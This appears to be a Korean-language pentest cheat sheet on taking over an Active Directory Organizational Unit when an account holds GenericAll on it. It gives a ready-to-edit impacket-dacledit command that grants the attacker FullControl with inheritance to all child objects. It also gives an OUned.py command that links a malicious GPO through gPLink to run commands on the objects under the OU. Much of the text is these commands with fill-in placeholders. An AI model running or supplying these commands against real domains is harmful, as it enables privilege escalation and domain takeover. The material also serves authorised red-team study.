# OU 대상

OU에 GenericAll이 있으면 OU 하위 모든 오브젝트를 장악할 수 있다.

---

## ACL 상속

-inheritance 플래그로 OU 하위 모든 오브젝트에 ACE를 전파한다. adminCount=1 오브젝트는 AdminSDHolder 보호로 상속되지 않는다.

```bash
# -inheritance: 하위 오브젝트 전파
impacket-dacledit <도메인>/<공격자계정>:'<패스워드>' \
  -dc-ip <DC_IP> \
  -action write \
  -rights FullControl \
  -principal <공격자계정> \
  -target-dn 'OU=<대상OU>,DC=<도메인>,DC=LOCAL' \
  -inheritance  # ← 수정
```

---

## gPLink 조작

OU에 악성 GPO를 링크해 하위 오브젝트에 명령을 실행한다. adminCount=1 오브젝트도 영향을 받으며 2024년 Synacktiv이 발견한 기법이다.

```bash
# GUI에서 OU 선택 후 GUID 확인 → --ou-guid에 입력
python3 OUned.py \
  --dc-ip <DC_IP> -d <도메인> \
  -u <공격자계정> -p '<패스워드>' \
  --ou-guid '<OU_GUID>'  # ← 수정
```